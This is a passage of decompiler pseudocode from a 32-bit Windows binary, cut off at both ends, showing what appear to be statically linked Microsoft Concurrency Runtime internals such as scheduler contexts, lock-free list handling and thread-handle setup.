  *(_DWORD *)(this + 4) = a2 + 12;
  return sub_430514((_DWORD *)(this + 8));
}

//----- (00440151) --------------------------------------------------------
_DWORD *__thiscall sub_440151(char *this, _DWORD *a2, int a3)
{
  _DWORD *v3; // esi
  int v5[4]; // [esp+Ch] [ebp-10h] BYREF

  v3 = *(_DWORD **)&this[((*a2 & 0xFFFFFFF) != 0 ? 0xFFFFFFFC : 0) + 16];
  sub_43DB38(*(int **)(a3 + 4), v5);
  while ( v3 && (!sub_438310(v3 + 3, a2) || v3[2] != a3) )
    v3 = (_DWORD *)v3[65];
  return v3;
}
// 440151: using guessed type int var_10[4];

//----- (004401A5) --------------------------------------------------------
struct _SINGLE_LIST_ENTRY *__thiscall sub_4401A5(union _SLIST_HEADER *this)
{
  int v2; // esi
  int Next; // ebx
  struct _SINGLE_LIST_ENTRY *v4; // eax
  struct _SINGLE_LIST_ENTRY *v6; // esi
  struct _SINGLE_LIST_ENTRY *v7; // [esp+Ch] [ebp-4h]

  v2 = 0;
  Next = (int)this[29].Next.Next;
  if ( Next <= 0 )
    return 0;
  while ( 1 )
  {
    v4 = (struct _SINGLE_LIST_ENTRY *)sub_434DA3(&this[21], v2);
    v7 = v4;
    if ( v4 )
    {
      if ( sub_44056C(this + 21, v4, v2, 0) )
        break;
    }
    if ( ++v2 >= Next )
      return 0;
  }
  v6 = v7[2].Next;
  _InterlockedExchange((volatile __int32 *)&v6[14], 0);
  sub_436AC6(this[32].Next.Next);
  return v6;
}

//----- (0044020A) --------------------------------------------------------
int __thiscall sub_44020A(_DWORD *this, int a2, char a3)
{
  int v4; // eax
  int v5; // esi

  v4 = sub_43600C(*(_DWORD *)(this[64] + 4), 1);
  v5 = v4;
  if ( v4 )
    sub_43EAA5(v4, (int)this, a2, a3);
  return v5;
}

//----- (0044023D) --------------------------------------------------------
int __thiscall sub_44023D(int *this)
{
  int *v1; // ecx

  v1 = this + 10;
  if ( *v1 )
    return sub_4400A3(v1);
  else
    return 0;
}

//----- (0044024D) --------------------------------------------------------
_DWORD *__thiscall sub_44024D(int *this, int a2)
{
  _DWORD *v3; // ecx
  _DWORD *result; // eax

  v3 = operator new(0x2Cu);
  result = 0;
  if ( v3 )
    result = sub_43F829(v3, *this, (int)(this + 1), this[3], this[3] + *(_DWORD *)(a2 + 16));
  this[4] = (int)result;
  *(_DWORD *)(a2 + 24) = result;
  return result;
}

//----- (00440297) --------------------------------------------------------
bool __thiscall sub_440297(_DWORD *this)
{
  return this[10] != 0;
}

//----- (0044029F) --------------------------------------------------------
bool __thiscall sub_44029F(void *this)
{
  return sub_4404A1((int)this) != 0;
}

//----- (004402AA) --------------------------------------------------------
int __thiscall sub_4402AA(_DWORD *this, int a2)
{
  int result; // eax

  result = sub_4357D5((int)(this + 1), a2);
  if ( this[5] )
    return sub_4357D5(this[5] + 4, a2);
  return result;
}

//----- (004402D3) --------------------------------------------------------
int __thiscall sub_4402D3(int *this, _DWORD *a2)
{
  this[5] = 1;
  return sub_4380FD(this + 8, a2);
}

//----- (004402E6) --------------------------------------------------------
int __thiscall sub_4402E6(int this, int a2, int a3, _DWORD *a4)
{
  void **v5; // eax
  void *v7[2]; // [esp+Ch] [ebp-8h] BYREF

  *(_DWORD *)(this + 256) = a2;
  *(_DWORD *)(this + 8) = a3;
  sub_4380FD((int *)(this + 12), a4);
  *(_DWORD *)(this + 272) = 0;
  *(_DWORD *)(this + 284) = 1;
  v5 = (void **)sub_435E59(*(unsigned int **)(a2 + 4), v7, a4);
  sub_43FA69((void **)(this + 28), v5);
  j_j_j___free_base(v7[1]);
  if ( (*a4 & 0xFFFFFFF) == 3 )
    *(_DWORD *)(this + 36) = sub_43CD76(*(unsigned int **)(a2 + 4), a4[2]);
  return sub_4402AA((_DWORD *)(this + 52), this + 28);
}

//----- (00440368) --------------------------------------------------------
bool __thiscall sub_440368(_DWORD *this)
{
  return this[1] <= *this && this[20] <= this[19];
}

//----- (0044037D) --------------------------------------------------------
_DWORD *__thiscall sub_44037D(int *this, unsigned int a2, char a3)
{
  _DWORD *v4; // ecx
  int v5; // edx

  if ( !this[5] )
    sub_43FF6B(this);
  if ( a3 )
    v4 = (_DWORD *)this[4];
  else
    v4 = (_DWORD *)this[5];
  while ( 1 )
  {
    v5 = (int)v4;
    if ( a2 < this[3] + v4[4] )
      break;
    v4 = (_DWORD *)v4[6];
    if ( !v4 )
    {
      v4 = sub_44024D(this, v5);
      if ( !v4 )
        break;
    }
  }
  return v4;
}

//----- (004403C5) --------------------------------------------------------
int __thiscall sub_4403C5(int this, int *a2, char a3)
{
  int v4; // eax
  int v5; // ebx
  int v6; // esi
  char i; // al
  int *v8; // eax
  int *v9; // eax
  int result; // eax
  int v11[4]; // [esp+Ch] [ebp-30h] BYREF
  int v12[4]; // [esp+1Ch] [ebp-20h] BYREF
  int v13[4]; // [esp+2Ch] [ebp-10h] BYREF

  v4 = sub_435B60(*(void **)(this + 4));
  if ( v4 )
    v5 = *(_DWORD *)(v4 + 4);
  else
    v5 = sub_4361F0(*(_DWORD **)(this + 4));
  sub_43DB38(*(int **)(v5 + 4), v12);
  v6 = v5;
  memset(v13, 0, sizeof(v13));
  for ( i = sub_442526((int)v12, a2); !i; i = sub_442526((int)v12, v9) )
  {
    v5 = sub_4361C7(*(_DWORD **)(this + 4), 0, v5);
    v8 = sub_43DB38(*(int **)(v5 + 4), v11);
    sub_4380FD(v12, v8);
    if ( v5 == v6 )
    {
      v9 = v13;
      a2 = v13;
    }
    else
    {
      v9 = a2;
    }
  }
  result = (*(int (__thiscall **)(int, int *, int))(*(_DWORD *)this + 36))(this, a2, v5);
  if ( !result && a3 )
  {
    sub_4304E3((volatile __int32 *)(this + 8));
    result = (*(int (__thiscall **)(int, int *, int))(*(_DWORD *)this + 36))(this, a2, v5);
    if ( !result )
      result = sub_43FEBA((char *)this, a2, v5);
    *(_DWORD *)(this + 8) = 0;
  }
  return result;
}
// 4403C5: using guessed type int var_20[4];
// 4403C5: using guessed type int var_30[4];

//----- (004404A1) --------------------------------------------------------
struct _SINGLE_LIST_ENTRY *__thiscall sub_4404A1(int this)
{
  int i; // edi
  struct _SINGLE_LIST_ENTRY *result; // eax

  for ( i = 0; i < *(_DWORD *)(this + 152); ++i )
  {
    result = (struct _SINGLE_LIST_ENTRY *)sub_434DA3((_DWORD *)(this + 88), i);
    if ( result )
    {
      if ( (int)result[1].Next > (int)result->Next || (int)result[20].Next > (int)result[19].Next )
        return result;
      if ( result[14].Next == (struct _SINGLE_LIST_ENTRY *)1 )
        sub_4406E6((union _SLIST_HEADER *)this, result);
    }
  }
  return (struct _SINGLE_LIST_ENTRY *)(*(_DWORD *)(this + 76) != *(_DWORD *)(this + 80));
}

//----- (004404FA) --------------------------------------------------------
int __thiscall sub_4404FA(int this)
{
  volatile __int32 *v2; // esi
  int v3; // eax

  v2 = *(volatile __int32 **)(this + 16);
  sub_4304D3(v2);
  v3 = *(_DWORD *)(this + 4);
  *(_BYTE *)(this + 20) = 1;
  *(_DWORD *)(this + 24) = v3;
  return sub_430514(v2);
}

//----- (0044052D) --------------------------------------------------------
volatile signed __int32 *__thiscall sub_44052D(_DWORD *this, int a2)
{
  return sub_43FAB8(this + 42, (_DWORD *)(a2 + 44));
}

//----- (00440546) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_440546(_DWORD *this, struct _SINGLE_LIST_ENTRY *a2)
{
  sub_43EBD8((int)a2);
  return sub_437280(*(_DWORD *)(this[64] + 4), a2, 0);
}

//----- (0044056C) --------------------------------------------------------
char __thiscall sub_44056C(PSLIST_HEADER ListHead, struct _SINGLE_LIST_ENTRY *a2, int a3, char a4)
{
  int v5; // edx
  int v6; // ebx
  struct _SINGLE_LIST_ENTRY *Next; // ecx
  int v8; // eax
  int v9; // edx
  int v10; // edi
  int v11; // edx
  USHORT DepthSList; // ax
  struct _SINGLE_LIST_ENTRY *v13; // eax
  struct _SINGLE_LIST_ENTRY *v15; // [esp-4h] [ebp-18h]
  int v16; // [esp-4h] [ebp-18h]

  v5 = a3 >> *(_DWORD *)&ListHead[5].Depth;
  v6 = a3 & ((int)&ListHead[5].Next.Next[-1].Next + 3);
  if ( v5 >= *(_DWORD *)&ListHead[7].Depth )
    return 0;
  Next = ListHead[7].Next.Next;
  v8 = *(_DWORD *)&ListHead[6].Depth;
  if ( v5 < (int)Next )
  {
    v10 = *(_DWORD *)(v8 + 4 * v5);
  }
  else
  {
    v9 = v5 - (_DWORD)Next;
    v10 = *(_DWORD *)(v8 + 4 * (_DWORD)Next - 4);
    if ( v9 >= 0 )
    {
      v11 = v9 + 1;
      do
      {
        v10 = *(_DWORD *)(v10 + 4);
        --v11;
      }
      while ( v11 );
    }
  }
  if ( (struct _SINGLE_LIST_ENTRY *)_InterlockedCompareExchange(
                                      (volatile signed __int32 *)(*(_DWORD *)v10 + 4 * v6),
                                      0,
                                      (signed __int32)a2) != a2 )
    return 0;
  _InterlockedCompareExchange((volatile signed __int32 *)(v10 + 8), v6, -2);
  if ( a4 )
  {
    DepthSList = QueryDepthSList(ListHead);
    v15 = a2 + 1;
    if ( DepthSList <= *(int *)&ListHead[8].Depth )
    {
      InterlockedPushEntrySList(ListHead, v15);
    }
    else
    {
      InterlockedPushEntrySList(ListHead + 1, v15);
      if ( QueryDepthSList(ListHead + 1) > *(int *)&ListHead[8].Depth
        && !sub_436498(*(_DWORD **)&ListHead[4].Depth)
        && !_InterlockedCompareExchange((volatile signed __int32 *)&ListHead[9], 1, 0) )
      {
        v13 = InterlockedFlushSList(ListHead + 1);
        v16 = *(_DWORD *)&ListHead[4].Depth;
        ListHead[2].Next.Next = v13;
        sub_436B3C(
          (int (__cdecl **)(int))&ListHead[2].Depth,
          (int (__cdecl *)(int))sub_43FE89,
          (int (__cdecl *)(int))ListHead,
          v16);
      }
    }
  }
  return 1;
}

//----- (0044065D) --------------------------------------------------------
char __thiscall sub_44065D(int this)
{
  sub_437646(*(_DWORD *)(*(_DWORD *)(this + 256) + 4), this + 272);
  return sub_43F669(*(char **)(this + 8), this);
}

//----- (00440680) --------------------------------------------------------
char __thiscall sub_440680(_DWORD *this)
{
  int v2; // ecx
  int v3; // esi
  char result; // al
  int v5; // ecx
  int v6; // esi

  v2 = this[4];
  if ( v2 )
  {
    do
    {
      v3 = *(_DWORD *)(v2 + 260);
      result = sub_44065D(v2);
      v2 = v3;
    }
    while ( v3 );
  }
  v5 = this[3];
  if ( v5 )
  {
    do
    {
      v6 = *(_DWORD *)(v5 + 260);
      result = sub_44065D(v5);
      v5 = v6;
    }
    while ( v6 );
  }
  this[4] = 0;
  this[3] = 0;
  return result;
}

//----- (004406BF) --------------------------------------------------------
signed __int32 __thiscall sub_4406BF(union _SLIST_HEADER *this, int a2)
{
  sub_438E47(this + 11, (struct _SINGLE_LIST_ENTRY *)a2, *(_DWORD *)(a2 + 68), 1);
  return sub_436AC6(this[32].Next.Next);
}

//----- (004406E6) --------------------------------------------------------
char __thiscall sub_4406E6(union _SLIST_HEADER *this, struct _SINGLE_LIST_ENTRY *a2)
{
  if ( sub_44056C(this + 21, a2 + 11, (int)a2[11].Next, 0) )
  {
    if ( (int)a2[20].Next <= (int)a2[19].Next )
    {
      sub_44165D((int)a2, (int)this);
      return 1;
    }
    sub_4415FF((int)a2, (int)this);
  }
  return 0;
}

//----- (00440728) --------------------------------------------------------
int __thiscall sub_440728(void *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3, int a4)
{
  _DWORD *v4; // eax

  v4 = (_DWORD *)(*(int (__thiscall **)(void *, int, int))(*(_DWORD *)this + 20))(this, a4, 1);
  return sub_440780(v4, a2, a3);
}

//----- (00440758) --------------------------------------------------------
int __thiscall sub_440758(void *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3)
{
  _DWORD *v3; // eax

  v3 = (_DWORD *)(*(int (__thiscall **)(void *, int, int))(*(_DWORD *)this + 20))(this, (int)this + 32, 1);
  return sub_440780(v3, a2, a3);
}

//----- (00440780) --------------------------------------------------------
int __thiscall sub_440780(_DWORD *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3)
{
  int v4; // eax
  int v5; // edi
  int v6; // eax
  int v7; // ecx
  _DWORD *v8; // eax
  _DWORD *v9; // esi
  int v10; // eax
  _DWORD *v11; // esi
  _DWORD *v12; // edx
  int result; // eax
  int (__thiscall *v14)(int, _DWORD *, int, int, struct _SINGLE_LIST_ENTRY *, struct _SINGLE_LIST_ENTRY *); // esi
  int v15[2]; // [esp-10h] [ebp-2Ch] BYREF
  struct _SINGLE_LIST_ENTRY *v16; // [esp-8h] [ebp-24h]
  struct _SINGLE_LIST_ENTRY *v17; // [esp-4h] [ebp-20h]
  char pExceptionObject[12]; // [esp+Ch] [ebp-10h] BYREF
  _DWORD *v19; // [esp+18h] [ebp-4h]

  if ( !a2 )
  {
    sub_429626((std::exception *)pExceptionObject, "proc");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  v4 = this[64];
  v17 = a3;
  v16 = a2;
  v5 = *(_DWORD *)(v4 + 4);
  v6 = sub_43627E((union _SLIST_HEADER *)v5, a2, a3);
  v7 = this[64];
  if ( (*(_BYTE *)(v7 + 48) & 4) == 0 )
    _InterlockedIncrement((volatile signed __int32 *)(v7 + 20));
  sub_440116((int)(this + 10), v6);
  v8 = sub_4359BC();
  v9 = v8;
  if ( v8 && sub_41DA3D(v8) == v5 )
  {
    v10 = v9[39];
    if ( *((_BYTE *)v9 + 76) )
      ++*(_DWORD *)(v10 + 8);
    else
      ++*(_DWORD *)(v10 + 104);
  }
  else
  {
    v11 = sub_430184(*(_DWORD *)(v5 + 24));
    if ( !v11 )
    {
      v11 = operator new(0x1Cu);
      v19 = v11;
      if ( v11 )
      {
        v11[2] = 0;
        v11[3] = 0;
        v11[4] = 0;
        v11[5] = 0;
        v11[6] = 1;
      }
      else
      {
        v11 = 0;
      }
      sub_43FAB8((_DWORD *)(v5 + 200), v11);
      sub_430192(*(_DWORD *)(v5 + 24), v11);
    }
    ++v11[2];
  }
  v12 = this + 3;
  if ( (this[3] & 0xFFFFFFF) != 0 )
  {
    (*(void (__thiscall **)(_DWORD *))(*this + 4))(this);
    v12 = this + 3;
  }
  result = *(_DWORD *)(v5 + 440);
  if ( *(_DWORD *)(v5 + 436) - result > 0 )
  {
    v14 = *(int (__thiscall **)(int, _DWORD *, int, int, struct _SINGLE_LIST_ENTRY *, struct _SINGLE_LIST_ENTRY *))(*(_DWORD *)v5 + 56);
    sub_4380FD(v15, v12);
    return v14(v5, this, v15[0], v15[1], v16, v17);
  }
  return result;
}

//----- (004408B4) --------------------------------------------------------
int __thiscall sub_4408B4(int this, unsigned int a2)
{
  int result; // eax

  result = this + 20;
  if ( !(a2 + _InterlockedExchangeAdd((volatile signed __int32 *)(this + 20), a2)) )
    return sub_436B3C(
             (int (__cdecl **)(int))(this + 28),
             (int (__cdecl *)(int))sub_438F91,
             (int (__cdecl *)(int))this,
             *(_DWORD *)this);
  return result;
}

//----- (004408DA) --------------------------------------------------------
_BYTE *__thiscall sub_4408DA(int this, char a2)
{
  int v3; // ebx
  int v4; // eax
  _DWORD *v5; // edx
  volatile __int32 *v6; // eax
  volatile __int32 *v7; // edi
  _BYTE *result; // eax
  int v9; // ecx
  int v10; // eax
  int v11; // ecx
  bool v12; // zf
  bool v13; // al
  int v14; // eax
  volatile __int32 *v15; // eax
  volatile __int32 *v16; // edi
  char v17; // al
  struct _SINGLE_LIST_ENTRY *v18; // eax
  int v19; // [esp+Ch] [ebp-5Ch]
  _BYTE *v20; // [esp+14h] [ebp-54h] BYREF
  int v21; // [esp+18h] [ebp-50h]
  int v22; // [esp+1Ch] [ebp-4Ch]
  char v23; // [esp+22h] [ebp-46h] BYREF
  char v24; // [esp+23h] [ebp-45h]
  int v25[16]; // [esp+24h] [ebp-44h]

  v3 = 0;
  v24 = 0;
  v19 = *(_DWORD *)(this + 152);
  if ( v19 > 0 )
  {
    v4 = 0;
    v21 = 0;
    v23 = 0;
    v5 = (_DWORD *)(this + 88);
    v22 = 0;
    while ( 1 )
    {
      v6 = (volatile __int32 *)sub_434DA3(v5, v4);
      v7 = v6;
      if ( !v6 )
        goto LABEL_15;
      if ( sub_440368(v6) )
        break;
      result = (_BYTE *)sub_4417A6(v7, a2, &v23);
      v20 = result;
      if ( result )
        return result;
      if ( v23 )
        goto LABEL_10;
      v9 = v21;
      if ( v21 >= 15 )
      {
        result = (_BYTE *)sub_4416A3(v7, a2);
        v20 = result;
        if ( result )
          return result;
LABEL_10:
        if ( *((_DWORD *)v7 + 14) != 1 || (v12 = !sub_440368(v7), v13 = 1, v12) )
          v13 = 0;
        goto LABEL_14;
      }
      v10 = v22;
      v25[v21] = v22;
      v11 = v9 + 1;
      v21 = v11;
LABEL_16:
      v4 = v10 + 1;
      v5 = (_DWORD *)(this + 88);
      v22 = v4;
      if ( v4 >= v19 )
      {
        if ( v11 > 0 )
        {
          v14 = 0;
          v22 = 0;
          while ( 1 )
          {
            v15 = (volatile __int32 *)sub_434DA3((_DWORD *)(this + 88), v25[v14]);
            v16 = v15;
            if ( v15 )
            {
              if ( !sub_440368(v15) )
              {
                result = (_BYTE *)sub_4416A3(v16, a2);
                v20 = result;
                if ( result )
                  return result;
              }
              if ( *((_DWORD *)v16 + 14) != 1 || (v12 = !sub_440368(v16), v17 = 1, v12) )
                v17 = 0;
              v24 |= v17;
            }
            v14 = v22 + 1;
            v22 = v14;
            if ( v14 >= v21 )
              goto LABEL_27;
          }
        }
        goto LABEL_27;
      }
    }
    v13 = *((_DWORD *)v7 + 14) == 1;
LABEL_14:
    v24 |= v13;
LABEL_15:
    v10 = v22;
    v11 = v21;
    goto LABEL_16;
  }
LABEL_27:
  if ( sub_43FFE1((volatile signed __int32 *)(this + 52), &v20) )
  {
    sub_441A59(v20, 1);
    return v20;
  }
  else
  {
    if ( *(int *)(this + 232) > 0 && v24 && *(int *)(this + 152) > 0 )
    {
      do
      {
        v18 = (struct _SINGLE_LIST_ENTRY *)sub_434DA3((_DWORD *)(this + 88), v3);
        if ( v18 && v18[14].Next == (struct _SINGLE_LIST_ENTRY *)1 && (int)v18[20].Next <= (int)v18[19].Next )
          sub_4406E6((union _SLIST_HEADER *)this, v18);
        ++v3;
      }
      while ( v3 < *(_DWORD *)(this + 152) );
    }
    return 0;
  }
}
// 4408DA: using guessed type int var_44[16];

//----- (00440A85) --------------------------------------------------------
_DWORD *__thiscall sub_440A85(int *this, _DWORD *a2, int a3)
{
  int v4; // esi
  unsigned int v5; // ebx
  unsigned int v6; // esi

  sub_4347C5(a2, *this);
  v4 = *this;
  v5 = 0;
  v6 = (unsigned int)(v4 + 31) >> 5;
  if ( v6 )
  {
    do
    {
      *(_DWORD *)(a2[1] + 4 * v5) = *(_DWORD *)(this[1] + 4 * v5) & *(_DWORD *)(*(_DWORD *)(a3 + 4) + 4 * v5);
      ++v5;
    }
    while ( v5 < v6 );
  }
  return a2;
}

//----- (00440AD1) --------------------------------------------------------
int __thiscall sub_440AD1(void *this, int a2)
{
  return sub_440B2F((int)this + 296, a2);
}

//----- (00440AE0) --------------------------------------------------------
_DWORD *__thiscall sub_440AE0(int this, _DWORD *a2, int a3)
{
  volatile signed __int32 *v4; // ebx
  _DWORD *v5; // esi
  int v6; // edi
  _DWORD *result; // eax
  _DWORD *v8; // [esp+Ch] [ebp-4h]

  v8 = (_DWORD *)(this + 32);
  sub_4304E3((volatile __int32 *)(this + 32));
  v4 = (volatile signed __int32 *)(this + 28);
  v5 = sub_44037D((int *)this, *(_DWORD *)(this + 28), 1);
  v6 = *v4 - v5[4];
  *(_DWORD *)(v5[3] + 4 * v6) = a3;
  _InterlockedIncrement(v4);
  *v8 = 0;
  result = a2;
  a2[1] = v6;
  *a2 = v5;
  return result;
}

//----- (00440B2F) --------------------------------------------------------
int __thiscall sub_440B2F(int this, int a2)
{
  sub_4304D3((volatile __int32 *)(this + 8));
  *(_DWORD *)(a2 + 232) = 0;
  **(_DWORD **)(this + 4) = a2;
  *(_DWORD *)(this + 4) = a2 + 232;
  return sub_430514((_DWORD *)(this + 8));
}

//----- (00440B6D) --------------------------------------------------------
volatile signed __int32 *__thiscall sub_440B6D(_DWORD *this, int a2)
{
  unsigned int v2; // edi
  unsigned int v3; // esi
  volatile signed __int32 *result; // eax

  v2 = 0;
  v3 = (unsigned int)(*this + 31) >> 5;
  if ( v3 )
  {
    do
    {
      result = (volatile signed __int32 *)(4 * v2 + this[1]);
      _InterlockedOr(result, *(_DWORD *)(*(_DWORD *)(a2 + 4) + 4 * v2++));
    }
    while ( v2 < v3 );
  }
  return result;
}

//----- (00440BA5) --------------------------------------------------------
_DWORD *__thiscall sub_440BA5(void *this, _DWORD *a2, int a3, int a4, _DWORD *a5)
{
  void *v5; // eax

  v5 = (void *)(*(int (__thiscall **)(void *, int, int))(*(_DWORD *)this + 20))(this, a4, 1);
  *a5 = v5;
  sub_440BDD(v5, a2, a3);
  return a2;
}

//----- (00440BDD) --------------------------------------------------------
_DWORD *__thiscall sub_440BDD(void *this, _DWORD *a2, int a3)
{
  sub_440AE0((int)this + 52, a2, a3);
  return a2;
}

//----- (00440BF5) --------------------------------------------------------
int __thiscall sub_440BF5(int *this)
{
  _DWORD *v2; // edi
  int result; // eax

  v2 = *(_DWORD **)(this[64] + 4);
  sub_440C28(v2, this + 7);
  result = this[3] & 0xFFFFFFF;
  if ( result == 3 )
    return sub_440C66(v2, this[9], (signed __int32)this);
  return result;
}

//----- (00440C28) --------------------------------------------------------
void __thiscall sub_440C28(_DWORD *this, int *a2)
{
  _DWORD *v3; // eax
  void *v4[2]; // [esp+8h] [ebp-8h] BYREF

  if ( sub_436B00(a2, (int)(this + 18)) )
  {
    v3 = sub_440A85(a2, v4, (int)(this + 18));
    sub_440B6D(this + 21, (int)v3);
    j_j_j___free_base(v4[1]);
  }
}

//----- (00440C66) --------------------------------------------------------
signed __int32 __thiscall sub_440C66(_DWORD *this, int a2, signed __int32 a3)
{
  signed __int32 result; // eax

  result = this[23];
  if ( !*(_DWORD *)((a2 << 7) + result) )
    return _InterlockedCompareExchange((volatile signed __int32 *)((a2 << 7) + this[23]), a3, 0);
  return result;
}

//----- (00440C8C) --------------------------------------------------------
_DWORD *__thiscall sub_440C8C(int this, int a2, int a3)
{
  bool v3; // zf
  int v5[4]; // [esp+0h] [ebp-10h] BYREF

  v3 = (*(_BYTE *)(this + 48) & 4) == 0;
  memset(v5, 0, sizeof(v5));
  if ( v3 )
    return *(_DWORD **)(this + 56);
  else
    return sub_440151((char *)this, v5, a3);
}

//----- (00440CBB) --------------------------------------------------------
int __thiscall sub_440CBB(int this, int a2, char a3)
{
  int result; // eax
  int v5; // eax
  int v6[4]; // [esp+8h] [ebp-10h] BYREF

  memset(v6, 0, sizeof(v6));
  if ( (*(_BYTE *)(this + 48) & 4) != 0 )
    return sub_4403C5(this, v6, a3);
  result = *(_DWORD *)(this + 56);
  if ( a3 && !result )
  {
    sub_4304E3((volatile __int32 *)(this + 8));
    result = *(_DWORD *)(this + 56);
    if ( !result )
    {
      v5 = sub_4361F0(*(_DWORD **)(this + 4));
      result = sub_43FEBA((char *)this, v6, v5);
      *(_DWORD *)(this + 56) = result;
    }
    *(_DWORD *)(this + 8) = 0;
  }
  return result;
}

//----- (00440D24) --------------------------------------------------------
_DWORD *__thiscall sub_440D24(_DWORD *this, int a2, char a3)
{
  int v4; // eax
  _DWORD *v5; // ecx
  _DWORD *v6; // eax
  _DWORD *v7; // ecx

  sub_43814B(this, a2, 1);
  *this = &Concurrency::details::ExternalContextBase::`vftable';
  this[40] = 0;
  this[41] = 0;
  v4 = sub_42FD5D(0);
  v5 = (_DWORD *)this[7];
  this[42] = v4;
  this[6] = sub_435E50(v5);
  v6 = operator new(0x1Cu);
  if ( v6 )
  {
    v6[2] = 0;
    v6[3] = 0;
    v6[4] = 0;
    v6[5] = 0;
    v6[6] = 1;
  }
  else
  {
    v6 = 0;
  }
  v7 = (_DWORD *)(this[7] + 200);
  this[39] = v6;
  sub_43FAB8(v7, v6);
  sub_440FBA((int)this, a3);
  return this;
}
// 471820: using guessed type void *Concurrency::details::ExternalContextBase::`vftable';

//----- (00440DBD) --------------------------------------------------------
void __thiscall sub_440DBD(_DWORD *this)
{
  *this = &Concurrency::details::ExternalContextBase::`vftable';
  sub_440E9E((int)this);
  sub_438292(this);
}
// 471820: using guessed type void *Concurrency::details::ExternalContextBase::`vftable';

//----- (00440E02) --------------------------------------------------------
_DWORD *__thiscall sub_440E02(_DWORD *Block, char a2)
{
  sub_440DBD(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (00440E27) --------------------------------------------------------
int *__thiscall sub_440E27(_DWORD *this, int a2)
{
  PSLIST_ENTRY v2; // eax

  v2 = sub_440F1B(this);
  if ( v2 )
    return sub_43DCAD(v2, a2);
  else
    return sub_43DDAF(a2);
}

//----- (00440E48) --------------------------------------------------------
DWORD __thiscall sub_440E48(int this)
{
  int v1; // ebx
  int v2; // eax
  DWORD result; // eax

  v1 = *(_DWORD *)(this + 8);
  v2 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 28) + 4))(*(_DWORD *)(this + 28));
  sub_43914D(3, 4u, v2, v1);
  result = _InterlockedIncrement((volatile signed __int32 *)(this + 44));
  if ( result == 1 )
    return WaitForSingleObjectEx(*(HANDLE *)(this + 168), 0xFFFFFFFF, 0);
  return result;
}

//----- (00440E9E) --------------------------------------------------------
int __thiscall sub_440E9E(int this)
{
  int result; // eax

  sub_4387A1(this);
  if ( *(_DWORD *)(this + 164) )
  {
    CloseHandle(*(HANDLE *)(this + 164));
    *(_DWORD *)(this + 164) = 0;
  }
  if ( *(_DWORD *)(this + 168) )
    CloseHandle(*(HANDLE *)(this + 168));
  if ( *(_DWORD *)(this + 160) )
    sub_4377DF(*(char **)(this + 160));
  result = *(_DWORD *)(this + 156);
  *(_DWORD *)(this + 156) = 0;
  *(_DWORD *)(result + 24) = 0;
  return result;
}

//----- (00440EF6) --------------------------------------------------------
void __thiscall sub_440EF6(_DWORD *this, int a2)
{
  int *v2; // eax

  v2 = (int *)sub_440F1B(this);
  if ( v2 )
    sub_43DD27(v2, a2);
  else
    j_j_j___free_base((void *)(a2 - 4));
}

//----- (00440F1B) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_440F1B(_DWORD *this)
{
  PSLIST_ENTRY result; // eax

  result = (PSLIST_ENTRY)this[40];
  if ( !result )
  {
    result = sub_436305(1);
    this[40] = result;
  }
  return result;
}

//----- (00440F38) --------------------------------------------------------
HMODULE __stdcall sub_440F38(int a1, int a2, int a3, int a4)
{
  sub_43597A(*(volatile signed __int32 **)(a2 + 28), (struct _SINGLE_LIST_ENTRY *)a2, 0);
  return sub_43049E(a1, a3);
}

//----- (00440F5A) --------------------------------------------------------
int __stdcall sub_440F5A(PVOID a1, int a2)
{
  sub_4301D4(*((HANDLE *)a1 + 43));
  return sub_43597A(*((volatile signed __int32 **)a1 + 7), (struct _SINGLE_LIST_ENTRY *)a1, 0);
}

//----- (00440F7D) --------------------------------------------------------
bool __thiscall sub_440F7D(_DWORD *this)
{
  return this[11] == 1;
}

//----- (00440F85) --------------------------------------------------------
int __thiscall sub_440F85(_DWORD *this, char a2)
{
  int v2; // eax
  int result; // eax
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  v2 = this[5];
  if ( a2 )
  {
    result = v2 + 1;
  }
  else
  {
    if ( !v2 )
    {
      std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_oversubscribe_operation_Concurrency__);
    }
    result = v2 - 1;
  }
  this[5] = result;
  return result;
}

//----- (00440FBA) --------------------------------------------------------
DWORD __thiscall sub_440FBA(int this, char a2)
{
  DWORD result; // eax
  HANDLE CurrentProcess; // edi
  HANDLE CurrentThread; // esi
  HANDLE v6; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+8h] [ebp-14h] BYREF
  PVOID Context; // [esp+18h] [ebp-4h]

  Context = (PVOID)this;
  *(_BYTE *)(this + 152) = a2;
  result = GetCurrentThreadId();
  *(_DWORD *)(this + 68) = result;
  if ( !a2 )
  {
    CurrentProcess = GetCurrentProcess();
    CurrentThread = GetCurrentThread();
    v6 = GetCurrentProcess();
    if ( !DuplicateHandle(v6, CurrentThread, CurrentProcess, (LPHANDLE)Context + 41, 0, 0, 2u) )
    {
      LastError = GetLastError();
      if ( LastError <= 0 )
        goto LABEL_11;
      goto LABEL_10;
    }
    if ( sub_43268A() < 3 )
    {
      result = (DWORD)sub_430038(*((HANDLE *)Context + 41), (WAITORTIMERCALLBACK)sub_440F5A, Context);
      *((_DWORD *)Context + 43) = result;
    }
    else
    {
      result = sub_43042F(*((_DWORD *)Context + 41), (int)sub_440F38, (int)Context);
      *((_DWORD *)Context + 43) = result;
      if ( !result )
      {
        LastError = GetLastError();
        if ( LastError <= 0 )
          goto LABEL_11;
LABEL_10:
        LastError = (unsigned __int16)LastError | 0x80070000;
LABEL_11:
        sub_43065D(pExceptionObject, LastError);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
      }
    }
  }
  return result;
}
// 43268A: using guessed type int sub_43268A(void);
// 440FBA: using guessed type _DWORD pExceptionObject[4];

//----- (00441093) --------------------------------------------------------
int __thiscall sub_441093(int this)
{
  int result; // eax

  sub_438D74((int *)this);
  result = *(_DWORD *)(this + 164);
